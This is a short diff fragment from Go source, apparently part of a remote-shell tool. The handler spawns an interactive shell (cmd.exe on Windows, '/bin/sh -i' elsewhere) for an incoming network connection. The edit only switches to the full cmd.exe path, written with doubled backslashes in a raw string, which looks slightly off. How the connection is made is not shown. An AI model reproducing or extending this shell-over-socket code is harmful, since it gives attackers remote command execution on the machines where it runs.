@@ -43,7 +43,7 @@ func handle(conn net.Conn) {
 	defer conn.Close()
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd.exe")
+		cmd = exec.Command(`C:\\Windows\\System32\\cmd.exe`)
 	} else {
 		cmd = exec.Command("/bin/sh", "-i")
 	}
